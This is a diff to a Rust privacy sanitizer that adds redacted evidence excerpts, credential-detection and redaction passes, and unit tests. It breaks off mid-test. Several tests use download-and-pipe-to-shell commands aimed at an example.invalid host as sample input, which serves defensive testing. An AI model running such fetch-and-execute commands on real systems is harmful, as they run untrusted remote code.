@@ -1,4 +1,5 @@
 use std::fmt;
+use std::ops::Range;
 use std::sync::LazyLock;
 
 use regex::Regex;
@@ -8,6 +9,7 @@ const MAX_INPUT_BYTES: usize = 4096;
 const MAX_REDACTED_EVIDENCE_BYTES: usize = 512;
 const MAX_DIAGNOSTIC_BYTES: usize = 200;
 const MAX_PATH_BYTES: usize = 256;
+const MAX_EVIDENCE_TOKENS: usize = 80;
 /// Upper bound for the reusable serialized-event marker checker. Event payloads
 /// are already bounded before persistence, so larger input is not safe to scan.
 pub const MAX_SERIALIZED_EVENT_BYTES: usize = 1_048_576;
@@ -23,6 +25,13 @@ static PRIVATE_KEY_BLOCK_RE: LazyLock<Regex> = LazyLock::new(|| {
         r"(?is)-{5}\s*BEGIN\s+(?:(?:[A-Z0-9 ]+\s+)?PRIVATE\s+KEY|PGP\s+PRIVATE\s+KEY\s+BLOCK)\s*-{5}.*?(?:-{5}\s*END\s+(?:(?:[A-Z0-9 ]+\s+)?PRIVATE\s+KEY|PGP\s+PRIVATE\s+KEY\s+BLOCK)\s*-{5}|$)",
     )
     .expect("private key block regex")
+});
+
+static PRIVATE_KEY_END_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?i)-{5}\s*END\s+(?:(?:[A-Z0-9 ]+\s+)?PRIVATE\s+KEY|PGP\s+PRIVATE\s+KEY\s+BLOCK)\s*-{5}",
+    )
+    .expect("private key end regex")
 });
 
 static PRIVATE_KEY_PHRASE_RE: LazyLock<Regex> = LazyLock::new(|| {
@@ -166,109 +175,12 @@ impl PrivacySanitizer {
         charge(text.len().min(MAX_INPUT_BYTES))?;
         let bounded = bounded_input(text);
         charge(bounded.text.len())?;
-        let mut redacted = if bounded.was_truncated {
+        let redacted = if bounded.was_truncated {
             neutralize_truncated_tail(&bounded.text)
         } else {
             bounded.text
         };
-        charge(redacted.len())?;
-        let encoded_reservation = if has_percent_escape(&redacted) {
-            redacted
-                .len()
-                .saturating_mul(redacted.len().max(1))
-                .saturating_mul(4)
-        } else {
-            redacted.len().saturating_mul(4)
-        };
-        charge(encoded_reservation)?;
-        redacted = redact_encoded_url_candidates(&redacted, charge)?;
-        redacted = redact_urls_at_depth(&redacted, 0, charge)?;
-        charge(redacted.len())?;
-        redacted = PRIVATE_KEY_BLOCK_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        redacted = redact_assignments(&redacted, true, charge)?;
-        charge(redacted.len())?;
-        redacted = redacted.replace(
-            "https://darkroastcyber.io/mcp-lab",
-            "https://darkroastcyber.io/[redacted]",
-        );
-        charge(redacted.len())?;
-        redacted = redacted.replace("darkroastcyber.io", "[controlled-domain]");
-        charge(redacted.len().saturating_mul(4))?;
-        redacted = redact_sensitive_labels(&redacted);
-        charge(redacted.len())?;
-        redacted = PACKAGE_MANAGER_RE
-            .replace_all(&redacted, "[package-manager-command]")
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = STARTUP_TARGET_RE
-            .replace_all(&redacted, "[startup-target]")
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = ENCODED_DECODER_RE
-            .replace_all(&redacted, "[encoded-decoder]")
-            .into_owned();
-        charge(redacted.len().saturating_mul(16))?;
-        redacted = redact_paths(&redacted, path_marker(context));
-        if context == SanitizationContext::Diagnostic {
-            charge(redacted.len())?;
-            redacted = redacted.replace(SENSITIVE_PATH, DIAGNOSTIC_PATH);
-        }
-        charge(redacted.len())?;
-        redacted = PRIVATE_KEY_PHRASE_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = CREDENTIAL_GH_TOKEN_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = CREDENTIAL_SK_KEY_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = CREDENTIAL_AKIA_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = CREDENTIAL_XOX_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = CREDENTIAL_JWT_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = CREDENTIAL_BEARER_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = HIGH_CONFIDENCE_GH_TOKEN_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = HIGH_CONFIDENCE_SK_KEY_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = HIGH_CONFIDENCE_AKIA_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = HIGH_CONFIDENCE_XOX_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = HIGH_CONFIDENCE_JWT_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len())?;
-        redacted = HIGH_CONFIDENCE_PRIVATE_KEY_RE
-            .replace_all(&redacted, REDACTED_SECRET)
-            .into_owned();
-        charge(redacted.len().saturating_mul(4))?;
-        redacted = redact_encoded_blobs_outside_urls(&redacted);
+        let redacted = redact_bounded(context, redacted, charge)?;
 
         charge(redacted.len())?;
         let normalized = if context == SanitizationContext::CommandResult {
@@ -276,7 +188,7 @@ impl PrivacySanitizer {
         } else {
             redacted
                 .split_whitespace()
-                .take(80)
+                .take(MAX_EVIDENCE_TOKENS)
                 .collect::<Vec<_>>()
                 .join(" ")
         };
@@ -289,9 +201,503 @@ impl PrivacySanitizer {
     }
 }
 
+/// Every pattern pass, in order, over text already within the input bound.
+fn redact_bounded<E>(
+    context: SanitizationContext,
+    mut redacted: String,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<String, E> {
+    charge(redacted.len())?;
+    let encoded_reservation = if has_percent_escape(&redacted) {
+        redacted
+            .len()
+            .saturating_mul(redacted.len().max(1))
+            .saturating_mul(4)
+    } else {
+        redacted.len().saturating_mul(4)
+    };
+    charge(encoded_reservation)?;
+    redacted = redact_encoded_url_candidates(&redacted, charge)?;
+    redacted = redact_urls_at_depth(&redacted, 0, charge)?;
+    charge(redacted.len())?;
+    redacted = PRIVATE_KEY_BLOCK_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    redacted = redact_assignments(&redacted, true, charge)?;
+    charge(redacted.len())?;
+    redacted = redacted.replace(
+        "https://darkroastcyber.io/mcp-lab",
+        "https://darkroastcyber.io/[redacted]",
+    );
+    charge(redacted.len())?;
+    redacted = redacted.replace("darkroastcyber.io", "[controlled-domain]");
+    charge(redacted.len().saturating_mul(4))?;
+    redacted = redact_sensitive_labels(&redacted);
+    charge(redacted.len())?;
+    redacted = PACKAGE_MANAGER_RE
+        .replace_all(&redacted, "[package-manager-command]")
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = STARTUP_TARGET_RE
+        .replace_all(&redacted, "[startup-target]")
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = ENCODED_DECODER_RE
+        .replace_all(&redacted, "[encoded-decoder]")
+        .into_owned();
+    charge(redacted.len().saturating_mul(16))?;
+    redacted = redact_paths(&redacted, path_marker(context));
+    if context == SanitizationContext::Diagnostic {
+        charge(redacted.len())?;
+        redacted = redacted.replace(SENSITIVE_PATH, DIAGNOSTIC_PATH);
+    }
+    charge(redacted.len())?;
+    redacted = PRIVATE_KEY_PHRASE_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = CREDENTIAL_GH_TOKEN_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = CREDENTIAL_SK_KEY_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = CREDENTIAL_AKIA_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = CREDENTIAL_XOX_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = CREDENTIAL_JWT_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = CREDENTIAL_BEARER_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = HIGH_CONFIDENCE_GH_TOKEN_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = HIGH_CONFIDENCE_SK_KEY_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = HIGH_CONFIDENCE_AKIA_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = HIGH_CONFIDENCE_XOX_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = HIGH_CONFIDENCE_JWT_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len())?;
+    redacted = HIGH_CONFIDENCE_PRIVATE_KEY_RE
+        .replace_all(&redacted, REDACTED_SECRET)
+        .into_owned();
+    charge(redacted.len().saturating_mul(4))?;
+    redacted = redact_encoded_blobs_outside_urls(&redacted);
+    Ok(redacted)
+}
+
 /// Compatibility wrapper for existing evidence callers.
 pub fn redact_sensitive_text(text: &str) -> String {
     PrivacySanitizer::sanitize(SanitizationContext::Evidence, text)
+}
+
+/// Evidence bytes shown before and after a hit when a field does not fit.
+const EXCERPT_BEFORE_BYTES: usize = 160;
+const EXCERPT_AFTER_BYTES: usize = 240;
+/// Raw bytes kept before the hit when a field exceeds the input bound. The
+/// rest of the bound follows the hit, so both raw cuts stay far outside the
+/// displayed excerpt.
+const EXCERPT_REGION_BEFORE_BYTES: usize = 1536;
+/// Text after a leading cut that is redacted but never shown: at least this
+/// many bytes, in whole fragments, and at least `LEADING_GUARD_FRAGMENTS`.
+/// A label the sanitizer reads across whitespace (`--password value`,
+/// `key = value`, `Bearer token`, a path with spaces) may sit before the cut
+/// while its value follows it.
+const LEADING_GUARD_BYTES: usize = 256;
+const LEADING_GUARD_FRAGMENTS: usize = 3;
+
+/// Redacted evidence that locates one hit in its field.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct EvidenceExcerpt {
+    /// The field whole when its redaction fits the evidence bounds, otherwise
+    /// a window around the hit. Always a fixed point of
+    /// [`redact_sensitive_text`].
+    pub text: String,
+    /// Byte range of the hit in `text`, set only when that position is exact.
+    pub highlight: Option<Range<usize>>,
+    /// Field text was cut before the excerpt.
+    pub elided_before: bool,
+    /// Field text was cut after the excerpt.
+    pub elided_after: bool,
+}
+
+impl PrivacySanitizer {
+    /// Evidence for the hit at byte range `hit` of `text`, in the evidence
+    /// context and bounds.
+    ///
+    /// A field longer than the input bound is sanitized as a raw region
+    /// around the hit. Both raw cuts are neutralized with the fragment rule
+    /// the input bound uses: the fragment holding a cut, including a quoted
+    /// value that spans it, is dropped, so a secret that straddles a cut is
+    /// never partly shown. A leading cut inside a private key block moves past
+    /// the block's end, and the text just after a leading cut is redacted but
+    /// not shown, since the label that would mask it may lie before the cut.
+    /// The excerpt is then cut from the region's redaction. The highlight is set only when redacting the text before,
+    /// at and after the hit separately reproduces the region's redaction, so
+    /// it never points at a guessed position; a hit that redaction merges
+    /// with its neighbors, or that a dropped fragment holds, gets `None`.
+    pub fn try_sanitize_excerpt<E>(
+        text: &str,
+        hit: Option<Range<usize>>,
+        charge: &mut impl FnMut(usize) -> Result<(), E>,
+    ) -> Result<EvidenceExcerpt, E> {
+        let hit = hit.filter(|hit| {
+            hit.start < hit.end
+                && hit.end <= text.len()
+                && text.is_char_boundary(hit.start)
+                && text.is_char_boundary(hit.end)
+        });
+        let (mut start, mut end) = (0, text.len());
+        if text.len() > MAX_INPUT_BYTES {
+            let anchor = hit.as_ref().map_or(0, |hit| hit.start);
+            start = floor_char_boundary(text, anchor.saturating_sub(EXCERPT_REGION_BEFORE_BYTES));
+            end = floor_char_boundary(text, start + MAX_INPUT_BYTES);
+            if start > 0 {
+                start = neutralize_leading_cut(text, start, end, charge)?;
+                start = skip_open_private_key_block(text, start, end, charge)?;
+            }
+            if end < text.len() {
+                end = neutralize_trailing_cut(text, start, end, charge)?;
+            }
+        }
+        let region = &text[start..end];
+        charge(region.len())?;
+        let redacted = redact_region(region, charge)?;
+
+        // The hit in the region's redaction: exact, or an anchor for placement.
+        let (highlight, anchor) = match &hit {
+            Some(hit) if hit.start >= start && hit.end <= end => exact_highlight(
+                region,
+                hit.start - start..hit.end - start,
+                &redacted,
+                charge,
+            )?,
+            Some(hit) if hit.start < start => (None, 0..0),
+            Some(_) => (None, redacted.len()..redacted.len()),
+            None => (None, 0..0),
+        };
+        // Only text past the leading guard may be shown.
+        let floor = if start > 0 {
+            let guard = leading_guard(region, charge)?;
+            shown_from(region, guard, &redacted, charge)?
+        } else {
+            0
+        };
+        let whole = &redacted[floor..];
+        let highlight = highlight
+            .filter(|range| range.start >= floor)
+            .map(|range| range.start - floor..range.end - floor);
+        let anchor = if anchor.start >= floor {
+            anchor.start - floor..anchor.end - floor
+        } else {
+            0..0
+        };
+        let tokens = token_spans(whole);
+        let (window, highlight) =
+            if whole.len() <= MAX_REDACTED_EVIDENCE_BYTES && tokens.len() <= MAX_EVIDENCE_TOKENS {
+                (0..whole.len(), highlight)
+            } else {
+                let (before, after) = if hit.is_some() {
+                    (EXCERPT_BEFORE_BYTES, EXCERPT_AFTER_BYTES)
+                } else {
+                    (0, MAX_REDACTED_EVIDENCE_BYTES)
+                };
+                excerpt_window(whole, &tokens, anchor, highlight, before, after)
+            };
+        let mut excerpt = whole[window.clone()].to_owned();
+        let mut highlight =
+            highlight.map(|range| range.start - window.start..range.end - window.start);
+        // Cutting whole tokens out of redacted text normally keeps it a fixed
+        // point; where a cut changes how the rest reads, redact again and
+        // drop the now unreliable position. Uncut, the excerpt is exactly
+        // `try_sanitize` output, which is already a fixed point.
+        let cut = start > 0 || end < text.len() || floor > 0 || window != (0..whole.len());
+        if cut {
+            let again = Self::try_sanitize(SanitizationContext::Evidence, &excerpt, charge)?;
+            if again != excerpt {
+                excerpt = again;
+                highlight = None;
+            }
+        }
+        charge(text.len())?;
+        Ok(EvidenceExcerpt {
+            text: excerpt,
+            highlight,
+            elided_before: floor + window.start > 0
+                || text[..start].chars().any(|c| !c.is_whitespace()),
+            elided_after: window.end < whole.len()
+                || text[end..].chars().any(|c| !c.is_whitespace()),
+        })
+    }
+}
+
+fn floor_char_boundary(text: &str, mut index: usize) -> usize {
+    index = index.min(text.len());
+    while !text.is_char_boundary(index) {
+        index -= 1;
+    }
+    index
+}
+
+/// Move a raw start cut past the fragment that holds it. The quote state at
+/// the cut comes from the text before it, so a quoted value that opened
+/// before the cut is dropped through its closing quote.
+fn neutralize_leading_cut<E>(
+    text: &str,
+    start: usize,
+    end: usize,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<usize, E> {
+    charge(start)?;
+    let mut scanner = FragmentScanner::default();
+    let mut at_boundary = false;
+    for character in text[..start].chars() {
+        at_boundary = scanner.step(character);
+    }
+    if at_boundary {
+        return Ok(start);
+    }
+    charge(end - start)?;
+    for (offset, character) in text[start..end].char_indices() {
+        if scanner.step(character) {
+            return Ok(start + offset);
+        }
+    }
+    Ok(end)
+}
+
+/// Move a leading cut that falls inside a private key block, one whose
+/// `BEGIN` line starts before the cut, past the block's `END` line.
+fn skip_open_private_key_block<E>(
+    text: &str,
+    start: usize,
+    end: usize,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<usize, E> {
+    // Include a `BEGIN` line that the cut itself splits.
+    let scanned = floor_char_boundary(text, start.saturating_add(64).min(end));
+    charge(scanned)?;
+    let open = PRIVATE_KEY_BLOCK_RE
+        .find_iter(&text[..scanned])
+        .filter(|block| block.start() < start)
+        .last()
+        .is_some_and(|block| block.end() > start && !PRIVATE_KEY_END_RE.is_match(block.as_str()));
+    if !open {
+        return Ok(start);
+    }
+    charge(end - start)?;
+    match PRIVATE_KEY_END_RE.find(&text[start..end]) {
+        Some(found) => neutralize_leading_cut(text, start + found.end(), end, charge),
+        None => Ok(end),
+    }
+}
+
+/// The offset in `region`, which starts at a leading cut, of the first
+/// fragment boundary past the leading guard.
+fn leading_guard<E>(
+    region: &str,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<usize, E> {
+    charge(region.len())?;
+    let mut scanner = FragmentScanner::default();
+    let mut fragments = 0;
+    let mut previous_boundary = true;
+    for (offset, character) in region.char_indices() {
+        let boundary = scanner.step(character);
+        if boundary && !previous_boundary {
+            fragments += 1;
+            if fragments >= LEADING_GUARD_FRAGMENTS && offset >= LEADING_GUARD_BYTES {
+                return Ok(offset);
+            }
+        }
+        previous_boundary = boundary;
+    }
+    Ok(region.len())
+}
+
+/// The offset in `redacted`, the redaction of `region`, from which no text
+/// derived from `region[..guard]` remains: past the guarded text's own
+/// redaction when `redacted` starts with it, otherwise past as many tokens as
+/// that redaction has, since redaction in context joins text rather than
+/// splitting it.
+fn shown_from<E>(
+    region: &str,
+    guard: usize,
+    redacted: &str,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<usize, E> {
+    let guarded = redact_region(&region[..guard], charge)?;
+    if guarded.is_empty() {
+        return Ok(0);
+    }
+    if redacted.starts_with(&guarded)
+        && matches!(redacted.as_bytes().get(guarded.len()), None | Some(b' '))
+    {
+        return Ok((guarded.len() + 1).min(redacted.len()));
+    }
+    let skip = token_spans(&guarded).len();
+    Ok(token_spans(redacted)
+        .get(skip)
+        .map_or(redacted.len(), |token| token.start))
+}
+
+/// Move a raw end cut back to the start of the fragment that holds it,
+/// unless the cut already ends a fragment.
+fn neutralize_trailing_cut<E>(
+    text: &str,
+    start: usize,
+    end: usize,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<usize, E> {
+    charge(end - start)?;
+    let mut scanner = FragmentScanner::default();
+    let mut fragment_start = start;
+    let mut at_boundary = false;
+    for (offset, character) in text[start..end].char_indices() {
+        at_boundary = scanner.step(character);
+        if at_boundary {
+            fragment_start = start + offset;
+        }
+    }
+    let next_ends_fragment =
+        scanner.quote.is_none() && text[end..].chars().next().is_some_and(char::is_whitespace);
+    Ok(if at_boundary || next_ends_fragment {
+        end
+    } else {
+        fragment_start
+    })
+}
+
+/// Evidence redaction of a region within the input bound, without the
+/// output byte and token bounds.
+fn redact_region<E>(
+    region: &str,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<String, E> {
+    let redacted = redact_bounded(SanitizationContext::Evidence, region.to_owned(), charge)?;
+    charge(redacted.len())?;
+    Ok(redacted.split_whitespace().collect::<Vec<_>>().join(" "))
+}
+
+/// The hit's range in `whole` when `whole` starts with the separate
+/// redactions of the text before the hit and of the hit, joined as the region
+/// joins them, plus an anchor for placing the excerpt either way. Only those
+/// two pieces are redacted: the text after the hit is the larger part of a
+/// region, and redaction can reserve work quadratic in its input.
+fn exact_highlight<E>(
+    region: &str,
+    hit: Range<usize>,
+    whole: &str,
+    charge: &mut impl FnMut(usize) -> Result<(), E>,
+) -> Result<(Option<Range<usize>>, Range<usize>), E> {
+    let (before, at) = (&region[..hit.start], &region[hit.clone()]);
+    let prefix = redact_region(before, charge)?;
+    let piece = redact_region(at, charge)?;
+    let space = !prefix.is_empty()
+        && (before.ends_with(char::is_whitespace) || at.starts_with(char::is_whitespace));
+    let start = prefix.len() + usize::from(space);
+    let located = start..start + piece.len();
+    let exact = !piece.is_empty()
+        && whole.starts_with(&prefix)
+        && (!space || whole.as_bytes().get(prefix.len()) == Some(&b' '))
+        && whole.get(located.clone()) == Some(piece.as_str());
+    let anchor = located.start.min(whole.len())..located.end.min(whole.len());
+    Ok((exact.then_some(located), anchor))
+}
+
+/// Byte ranges of the space-separated tokens of normalized text.
+fn token_spans(text: &str) -> Vec<Range<usize>> {
+    let mut spans = Vec::new();
+    let mut start = 0;
+    for token in text.split(' ') {
+        if !token.is_empty() {
+            spans.push(start..start + token.len());
+        }
+        start += token.len() + 1;
+    }
+    spans
+}
+
+/// Whole tokens around `anchor`, about `before` and `after` bytes on each
+/// side, within the evidence byte and token bounds. A highlight that cannot
+/// fit is dropped.
+fn excerpt_window(
+    whole: &str,
+    tokens: &[Range<usize>],
+    anchor: Range<usize>,
+    highlight: Option<Range<usize>>,
+    before: usize,
+    after: usize,
+) -> (Range<usize>, Option<Range<usize>>) {
+    if tokens.is_empty() {
+        return (0..0, None);
+    }
+    let first = tokens
+        .iter()
+        .position(|token| token.end > anchor.start)
+        .unwrap_or(tokens.len() - 1);
+    let last = tokens
+        .iter()
+        .rposition(|token| token.start < anchor.end)
+        .unwrap_or(first)
+        .max(first);
+    let fits = |low: usize, high: usize| {
+        high - low <= MAX_EVIDENCE_TOKENS
+            && tokens[high - 1].end - tokens[low].start <= MAX_REDACTED_EVIDENCE_BYTES
+    };
+    if !fits(first, last + 1) {
+        // The hit alone exceeds the bounds: show as much of it as fits.
+        let mut high = first + 1;
+        while high < tokens.len() && fits(first, high + 1) {
+            high += 1;
+        }
+        let start = tokens[first].start;
+        let end = floor_char_boundary(
+            whole,
+            tokens[high - 1]
+                .end
+                .min(start + MAX_REDACTED_EVIDENCE_BYTES),
+        );
+        return (start..end, None);
+    }
+    let (mut low, mut high) = (first, last + 1);
+    loop {
+        let mut grew = false;
+        if low > 0 && anchor.start - tokens[low - 1].start <= before && fits(low - 1, high) {
+            low -= 1;
+            grew = true;
+        }
+        if high < tokens.len() && tokens[high].end - anchor.end <= after && fits(low, high + 1) {
+            high += 1;
+            grew = true;
+        }
+        if !grew {
+            break;
+        }
+    }
+    (tokens[low].start..tokens[high - 1].end, highlight)
 }
 
 pub(crate) fn redact_error_message(text: &str) -> String {
@@ -1980,24 +2386,9 @@ fn neutralize_truncated_tail(bounded: &str) -> String {
 /// truncated assignment cannot expose a suffix after its last internal space.
 fn truncated_fragment_start(text: &str) -> Option<usize> {
     let mut fragment_start = 0;
-    let mut quote = None;
-    let mut escaped = false;
-
+    let mut scanner = FragmentScanner::default();
     for (offset, character) in text.char_indices() {
-        if let Some(active_quote) = quote {
-            if escaped {
-                escaped = false;
-            } else if character == '\\' {
-                escaped = true;
-            } else if character == active_quote {
-                quote = None;
-            }
-            continue;
-        }
-
-        if character == '"' || character == '\'' {
-            quote = Some(character);
-        } else if character.is_whitespace() {
+        if scanner.step(character) {
             fragment_start = offset + character.len_utf8();
         }
     }
@@ -2009,13 +2400,45 @@ fn truncated_fragment_start(text: &str) -> Option<usize> {
     }
 }
 
+/// The fragment rule shared by every cut: whitespace ends a fragment only
+/// outside a quoted value, and a backslash escapes inside one.
+#[derive(Clone, Copy, Default)]
+struct FragmentScanner {
+    quote: Option<char>,
+    escaped: bool,
+}
+
+impl FragmentScanner {
+    /// Advance by one character; true when it is a fragment boundary.
+    fn step(&mut self, character: char) -> bool {
+        if let Some(active_quote) = self.quote {
+            if self.escaped {
+                self.escaped = false;
+            } else if character == '\\' {
+                self.escaped = true;
+            } else if character == active_quote {
+                self.quote = None;
+            }
+            return false;
+        }
+        if character == '"' || character == '\'' {
+            self.quote = Some(character);
+            false
+        } else {
+            character.is_whitespace()
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
+    use std::ops::Range;
+
     use super::{
-        ControlledMarker, MAX_INPUT_BYTES, MAX_MARKER_DEPTH, MAX_SERIALIZED_EVENT_BYTES,
-        PrivacySanitizer, SanitizationContext, SerializedMarkerCheckError,
-        check_serialized_event_markers, contains_high_confidence_credential_marker,
-        redact_error_message, redact_sensitive_text,
+        ControlledMarker, EvidenceExcerpt, MAX_INPUT_BYTES, MAX_MARKER_DEPTH,
+        MAX_SERIALIZED_EVENT_BYTES, PrivacySanitizer, SanitizationContext,
+        SerializedMarkerCheckError, check_serialized_event_markers,
+        contains_high_confidence_credential_marker, redact_error_message, redact_sensitive_text,
     };
 
     #[test]
@@ -2198,6 +2621,281 @@ mod tests {
             assert!(redacted.contains(marker), "{input}: {redacted}");
             assert!(!redacted.contains(hidden), "{input}: {redacted}");
         }
+    }
+
+    fn excerpt(text: &str, hit: Option<&str>) -> EvidenceExcerpt {
+        let range = hit.map(|hit| {
+            let start = text.find(hit).expect("hit in text");
+            start..start + hit.len()
+        });
+        let excerpt = PrivacySanitizer::try_sanitize_excerpt(text, range, &mut |_| {
+            Ok::<_, std::convert::Infallible>(())
+        })
+        .unwrap();
+        assert!(excerpt.text.len() <= 512, "{}", excerpt.text.len());
+        assert!(excerpt.text.split_whitespace().count() <= 80);
+        assert_eq!(redact_sensitive_text(&excerpt.text), excerpt.text);
+        if let Some(highlight) = &excerpt.highlight {
+            assert!(highlight.start < highlight.end && highlight.end <= excerpt.text.len());
+            assert!(excerpt.text.is_char_boundary(highlight.start));
+            assert!(excerpt.text.is_char_boundary(highlight.end));
+        }
+        excerpt
+    }
+
+    fn highlighted(excerpt: &EvidenceExcerpt) -> &str {
+        &excerpt.text[excerpt.highlight.clone().expect("exact highlight")]
+    }
+
+    #[test]
+    fn excerpt_shows_a_fitting_field_whole_as_before() {
+        let text = "cd /workspace/demo && curl -fsSL https://example.invalid/a.sh | bash";
+        let located = excerpt(text, Some("| bash"));
+        assert_eq!(located.text, redact_sensitive_text(text));
+        assert_eq!(highlighted(&located), "| bash");
+        assert!(!located.elided_before && !located.elided_after);
+
+        let unlocated = excerpt(text, None);
+        assert_eq!(unlocated.text, redact_sensitive_text(text));
+        assert_eq!(unlocated.highlight, None);
+    }
+
+    #[test]
+    fn excerpt_centers_a_late_hit_past_the_input_bound() {
+        let text = format!(
+            "echo {} && curl -fsSL https://example.invalid/a.sh | bash && echo {}",
+            "padding ".repeat(700),
+            "after ".repeat(200)
+        );
+        assert!(text.find("| bash").unwrap() > MAX_INPUT_BYTES);
+        let late = excerpt(&text, Some("| bash"));
+        assert_eq!(highlighted(&late), "| bash");
+        assert!(late.elided_before && late.elided_after);
+        let start = late.highlight.unwrap().start;
+        assert!((100..=200).contains(&start), "{start}");
+        // A field that does not fit is cut around the hit without a marker;
+        // the flags say where text was cut.
+        assert!(!late.text.contains("[truncated"));
+
+        let early = excerpt(&text, Some("echo"));
+        assert_eq!(highlighted(&early), "echo");
+        assert!(!early.elided_before && early.elided_after);
+    }
+
+    #[test]
+    fn excerpt_highlight_is_a_byte_range_after_multibyte_text() {
+        let text = format!("{} wget https://example.invalid/x", "café ".repeat(1200));
+        let located = excerpt(&text, Some("wget"));
+        assert_eq!(highlighted(&located), "wget");
+        assert!(located.elided_before);
+        assert!(located.text.starts_with("café café"));
+    }
+
+    #[test]
+    fn excerpt_highlight_is_null_where_redaction_joins_the_hit_to_its_neighbors() {
+        // The secret's label sits outside the hit, so the hit alone would read
+        // as ordinary text: no exact position, and the secret stays redacted.
+        let text = "export password=tt_privacy_excerpt_25 && run";
+        let joined = excerpt(text, Some("tt_privacy_excerpt_25"));
+        assert_eq!(joined.highlight, None);
+        assert!(!joined.text.contains("tt_privacy_excerpt_25"));
+        assert_eq!(joined.text, redact_sensitive_text(text));
+
+        // A recognizable secret at the hit is located on its marker.
+        let marked = excerpt(
+            "aws AKIAPRIVATEMARKER234 configured",
+            Some("AKIAPRIVATEMARKER234"),
+        );
+        assert_eq!(highlighted(&marked), "[redacted-secret]");
+    }
+
+    #[test]
+    fn excerpt_drops_a_quoted_value_that_spans_either_raw_cut() {
+        // Neither quoted value has a label the sanitizer would recognize, so
+        // only the fragment rule keeps their cut parts out.
+        let quoted = format!("\"{}\"", "tt_privacy_lead_25 ".repeat(150));
+        let text = format!(
+            "{quoted} {} curl https://example.invalid/a | sh",
+            "x ".repeat(1000)
+        );
+        let lead = excerpt(&text, Some("| sh"));
+        assert!(!lead.text.contains("tt_privacy_lead_25"));
+        assert_eq!(highlighted(&lead), "| sh");
+
+        let quoted = format!("'{}'", "tt_privacy_tail_25 ".repeat(300));
+        let text = format!(
+            "{} curl https://example.invalid/a | sh {} {quoted}",
+            "x ".repeat(2600),
+            "y ".repeat(600)
+        );
+        let tail = excerpt(&text, Some("| sh"));
+        assert_eq!(highlighted(&tail), "| sh");
+        assert!(tail.elided_after);
+
+        // A hit inside a quoted value that opened before the cut is dropped
+        // with it: no highlight, and no part of the value.
+        let text = format!("x \"{} curl a | sh\" y", "tt_privacy_inner_25 ".repeat(300));
+        let inner = excerpt(&text, Some("| sh"));
+        assert_eq!(inner.highlight, None);
+        assert!(!inner.text.contains("tt_privacy_inner_25"));
+    }
+
+    #[test]
+    fn excerpt_never_shows_a_value_whose_label_a_leading_cut_dropped() {
+        // The raw cut falls inside `--password`; its value follows the cut,
+        // and a private key block redacts to one marker, so without a guard
+        // the value would sit just before the hit.
+        let head = "word ".repeat(700);
+        let label_at = head.len();
+        let mut text = format!("{head}--password tt_guard_marker_25 ");
+        let hit_at = label_at + 5 + 1536;
+        let mut block = String::from("-----BEGIN PRIVATE KEY-----\n");
+        while text.len() + block.len() + "-----END PRIVATE KEY-----\n".len() < hit_at {
+            block.push_str("QUJDRA0K");
+        }
+        let excess = text.len() + block.len() + "-----END PRIVATE KEY-----\n".len() - hit_at;
+        block.truncate(block.len() - excess);
+        text.push_str(&block);
